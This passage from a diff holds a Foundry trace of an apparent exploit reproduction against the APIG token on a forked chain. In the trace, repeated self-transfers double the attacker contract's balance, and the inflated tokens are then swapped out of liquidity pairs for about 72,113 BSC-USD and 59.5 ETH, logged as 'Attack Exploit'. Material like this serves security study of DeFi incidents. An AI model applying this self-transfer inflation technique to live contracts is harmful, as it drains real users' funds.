+    │   │   │   └─ ← [Return] 31487700261257776324444160 [3.148e25]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 31487700261257776324444160 [3.148e25])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 31487700261257776324444160 [3.148e25])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 62975400522515552648888320 [6.297e25]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 62975400522515552648888320 [6.297e25])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 62975400522515552648888320 [6.297e25])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 125950801045031105297776640 [1.259e26]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 125950801045031105297776640 [1.259e26])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 125950801045031105297776640 [1.259e26])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 251901602090062210595553280 [2.519e26]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 251901602090062210595553280 [2.519e26])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 251901602090062210595553280 [2.519e26])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 503803204180124421191106560 [5.038e26]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 503803204180124421191106560 [5.038e26])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 503803204180124421191106560 [5.038e26])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1007606408360248842382213120 [1.007e27]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1007606408360248842382213120 [1.007e27])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1007606408360248842382213120 [1.007e27])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 2015212816720497684764426240 [2.015e27]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2015212816720497684764426240 [2.015e27])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2015212816720497684764426240 [2.015e27])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 4030425633440995369528852480 [4.03e27]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4030425633440995369528852480 [4.03e27])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4030425633440995369528852480 [4.03e27])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 8060851266881990739057704960 [8.06e27]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8060851266881990739057704960 [8.06e27])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8060851266881990739057704960 [8.06e27])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 16121702533763981478115409920 [1.612e28]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16121702533763981478115409920 [1.612e28])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 16121702533763981478115409920 [1.612e28])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 32243405067527962956230819840 [3.224e28]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32243405067527962956230819840 [3.224e28])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 32243405067527962956230819840 [3.224e28])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 64486810135055925912461639680 [6.448e28]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 64486810135055925912461639680 [6.448e28])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 64486810135055925912461639680 [6.448e28])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 128973620270111851824923279360 [1.289e29]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 128973620270111851824923279360 [1.289e29])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 128973620270111851824923279360 [1.289e29])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 257947240540223703649846558720 [2.579e29]
+    │   │   ├─ [24695] APIG::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 257947240540223703649846558720 [2.579e29])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 257947240540223703649846558720 [2.579e29])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1732321] APIG::transfer(0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d], 21860669230901853234523053655 [2.186e28])
+    │   │   │   ├─ [439] 0xefbf_Pair::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 1020752150284861806910424 [1.02e24]
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xE076825873cBc623137d03ba9d0696f9B522B547) [staticcall]
+    │   │   │   │   └─ ← [Return] 108894444302728318743 [1.088e20]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xE076825873cBc623137d03ba9d0696f9B522B547, 1066805926123585361 [1.066e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xe025522F6A3558437eF72e2550268c98dFbe6211) [staticcall]
+    │   │   │   │   └─ ← [Return] 2771362104759295979675 [2.771e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xe025522F6A3558437eF72e2550268c98dFbe6211, 27150196097905751046 [2.715e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xdf967Fc0BcF092d3889FA97423f128074ab1CA04) [staticcall]
+    │   │   │   │   └─ ← [Return] 2827012911183817002549 [2.827e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xdf967Fc0BcF092d3889FA97423f128074ab1CA04, 27695390211961651147 [2.769e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xde3700523404679782a3d775Cb1751E4abd6908f) [staticcall]
+    │   │   │   │   └─ ← [Return] 2827012911183817002548 [2.827e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xde3700523404679782a3d775Cb1751E4abd6908f, 27695390211961651147 [2.769e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xdDd2bc5413947f501a8504141ED5f28A61f06419) [staticcall]
+    │   │   │   │   └─ ← [Return] 574374389515560651377 [5.743e20]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xdDd2bc5413947f501a8504141ED5f28A61f06419, 5626972123989841282 [5.626e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xdBa62E4503D35a5155e9b1bB0E96A275D4908fd5) [staticcall]
+    │   │   │   │   └─ ← [Return] 2828425710532627724502 [2.828e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xdBa62E4503D35a5155e9b1bB0E96A275D4908fd5, 27709230979756423378 [2.77e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xDB776138ee6FF7D12a486df2996F3a3ab54f5c89) [staticcall]
+    │   │   │   │   └─ ← [Return] 2827012911183817002548 [2.827e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xDB776138ee6FF7D12a486df2996F3a3ab54f5c89, 27695390211961651147 [2.769e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xdB4116Bd7Cd7886df2BcFa831a5401580ed9DA26) [staticcall]
+    │   │   │   │   └─ ← [Return] 2821356056934324622353 [2.821e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xdB4116Bd7Cd7886df2BcFa831a5401580ed9DA26, 27639971722292893466 [2.763e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xda9845B91cebc53348012ED63ff70585B389E171) [staticcall]
+    │   │   │   │   └─ ← [Return] 989949493661166534158 [9.899e20]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xda9845B91cebc53348012ED63ff70585B389E171, 9698235692032594198 [9.698e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xd9AFe83b10AC4dD79422F7556B5EE54347068175) [staticcall]
+    │   │   │   │   └─ ← [Return] 1414213562373095048798 [1.414e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xd9AFe83b10AC4dD79422F7556B5EE54347068175, 13854622417189420284 [1.385e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xD9881bE520bd9D6E3CDA1c5682F037cA09463979) [staticcall]
+    │   │   │   │   └─ ← [Return] 2825598697621443907499 [2.825e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xD9881bE520bd9D6E3CDA1c5682F037cA09463979, 27681535589544461727 [2.768e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xD3E5272B7fC46feb3A7bDb42334e2606c5393084) [staticcall]
+    │   │   │   │   └─ ← [Return] 2814284989122459147108 [2.814e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xD3E5272B7fC46feb3A7bDb42334e2606c5393084, 27570698610206946365 [2.757e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xD301CFe55057a6da6D66Ae4E6B4a11b442743615) [staticcall]
+    │   │   │   │   └─ ← [Return] 2800142853498728196622 [2.8e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xD301CFe55057a6da6D66Ae4E6B4a11b442743615, 27432152386035052162 [2.743e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xd1B3d9Bc68aEF533264fab263639d621A93E437d) [staticcall]
+    │   │   │   │   └─ ← [Return] 2828425710532627724502 [2.828e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xd1B3d9Bc68aEF533264fab263639d621A93E437d, 27709230979756423378 [2.77e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xd15bdC915b8739aDCa2b480D614B857C60D6AD96) [staticcall]
+    │   │   │   │   └─ ← [Return] 2821356056934324622352 [2.821e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xd15bdC915b8739aDCa2b480D614B857C60D6AD96, 27639971722292893466 [2.763e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xD0C41F754460BC8A40a31406FD739ab8dDda86FC) [staticcall]
+    │   │   │   │   └─ ← [Return] 2821356056934324622354 [2.821e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xD0C41F754460BC8A40a31406FD739ab8dDda86FC, 27639971722292893466 [2.763e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xcb23332C528563c24086CBAC1B688f99bc1645F2) [staticcall]
+    │   │   │   │   └─ ← [Return] 1916966483796730338646 [1.916e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xcb23332C528563c24086CBAC1B688f99bc1645F2, 18779940686500259194 [1.877e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xcB0A86a63cfF16BDEB41fC191Ace3612d83eeB2F) [staticcall]
+    │   │   │   │   └─ ← [Return] 2828425710532627724502 [2.828e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xcB0A86a63cfF16BDEB41fC191Ace3612d83eeB2F, 27709230979756423378 [2.77e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xCAAc12cc2084743825E2162D8958aD72c3695836) [staticcall]
+    │   │   │   │   └─ ← [Return] 707106781186547524399 [7.071e20]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xCAAc12cc2084743825E2162D8958aD72c3695836, 6927311208594710142 [6.927e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2537] 0xefbf_Pair::balanceOf(0xC9F2B25Bb1aFd2495B5477f2A3B95ED03A48d961) [staticcall]
+    │   │   │   │   └─ ← [Return] 2828424296319065351406 [2.828e21]
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(0xC9F2B25Bb1aFd2495B5477f2A3B95ED03A48d961, 27709217125134006189 [2.77e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], value: 655820076927055597035691608 [6.558e26])
+    │   │   │   ├─ emit Transfer(from: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], to: 0x01702e05C0b81702E05c0B81702E05C0B81702E0, value: 218606692309018532 [2.186e17])
+    │   │   │   ├─ emit Transfer(from: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], to: 0x016e1f76B4337C6cB1573d7F48f044a5E641c9A7, value: 198733356644562302 [1.987e17])
+    │   │   │   ├─ emit Transfer(from: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], to: 0x016c16c16c16C16C16c16C16c16C16c16c16c16C, value: 182172243590848776 [1.821e17])
+    │   │   │   ├─ emit Transfer(from: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], to: 0x016a13cD153729043E3B673fa57B0CbaB235BeF0, value: 168158994083860409 [1.681e17])
+    │   │   │   ├─ emit Transfer(from: APIG: [0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888], to: 0x0168168168168168168168168168168168168168, value: 156147637363584665 [1.561e17])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d], value: 21204849153974797637487361992 [2.12e28])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [22503] 0xefbf_Pair::swap(72628575425255057150292 [7.262e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [6071] BSC-USD::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 72628575425255057150292 [7.262e22])
+    │   │   │   │   ├─ emit Transfer(from: 0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 72628575425255057150292 [7.262e22])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] BSC-USD::balanceOf(0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d]) [staticcall]
+    │   │   │   │   └─ ← [Return] 50000000000000000000 [5e19]
+    │   │   │   ├─ [1873] APIG::balanceOf(0xefbf_Pair: [0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d]) [staticcall]
+    │   │   │   │   └─ ← [Return] 21219283778674554862364972692 [2.121e28]
+    │   │   │   ├─ emit Sync(reserve0: 50000000000000000000 [5e19], reserve1: 21219283778674554862364972692 [2.121e28])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 21204849153974797637487361992 [2.12e28], amount0Out: 72628575425255057150292 [7.262e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3271] BSC-USD::transfer(0xadad_Pair: [0xaDaD973f8920bc511d94aade2762284f621F1467], 515000000000000000000 [5.15e20])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xadad_Pair: [0xaDaD973f8920bc511d94aade2762284f621F1467], value: 515000000000000000000 [5.15e20])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1776] APIG::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 494033811849545554065170063840 [4.94e29]
+    │   │   ├─ [146436] APIG::transfer(0xb920_Pair: [0xb920456AeC6E88c68C16c8294688B2b63C81B2Ce], 494033811849545554065170063840 [4.94e29])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 148210143554863666219551019152 [1.482e29])
+    │   │   │   ├─ [49531] 0x2C117488e89749A29723A22B581d9547AD3fD9E5::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 148210143554863666219551019152 [1.482e29])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xb920_Pair: [0xb920456AeC6E88c68C16c8294688B2b63C81B2Ce], value: 345823668294681887845619044688 [3.458e29])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [102025] 0xb920_Pair::swap(59500000000000000000 [5.95e19], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [27971] ETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 59500000000000000000 [5.95e19])
+    │   │   │   │   ├─ emit Transfer(from: 0xb920_Pair: [0xb920456AeC6E88c68C16c8294688B2b63C81B2Ce], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 59500000000000000000 [5.95e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] ETH::balanceOf(0xb920_Pair: [0xb920456AeC6E88c68C16c8294688B2b63C81B2Ce]) [staticcall]
+    │   │   │   │   └─ ← [Return] 100000000000000000 [1e17]
+    │   │   │   ├─ [6011] APIG::balanceOf(0xb920_Pair: [0xb920456AeC6E88c68C16c8294688B2b63C81B2Ce]) [staticcall]
+    │   │   │   │   └─ ← [Return] 345906668294681887845619044688 [3.459e29]
+    │   │   │   ├─ emit Sync(reserve0: 100000000000000000 [1e17], reserve1: 345906668294681887845619044688 [3.459e29])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 345823668294681887845619044688 [3.458e29], amount0Out: 59500000000000000000 [5.95e19], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Stop] 
+    │   ├─ [531] BSC-USD::balanceOf(0xadad_Pair: [0xaDaD973f8920bc511d94aade2762284f621F1467]) [staticcall]
+    │   │   └─ ← [Return] 8439530972261973831380948 [8.439e24]
+    │   ├─ [2704] 0xeC1F55b5Be7Ee8c24Ee26B6Cc931ce4d7Fd5955C::balanceOf(0xadad_Pair: [0xaDaD973f8920bc511d94aade2762284f621F1467]) [staticcall]
+    │   │   └─ ← [Return] 2801569228770644957736583 [2.801e24]
+    │   ├─ emit Sync(reserve0: 8439530972261973831380948 [8.439e24], reserve1: 2801569228770644957736583 [2.801e24])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 515000000000000000000 [5.15e20], amount1In: 0, amount0Out: 500000000000000000000 [5e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Stop] 
+    ├─ [531] BSC-USD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 72113585425255057150292 [7.211e22]
+    ├─ [0] console::log("Attack Exploit: %s.%s USD", 72113 [7.211e4], 575425255057150292 [5.754e17]) [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [531] ETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 59500000000000000000 [5.95e19]
+    ├─ [531] ETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 59500000000000000000 [5.95e19]
+    ├─ [0] console::log("Attack Exploit: %s.%s ETH", 59, 500000000000000000 [5e17]) [staticcall]
+    │   └─ ← [Stop] 
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 304.49ms (12.42ms CPU time)
+
+Ran 2 test suites in 306.19ms (579.93ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
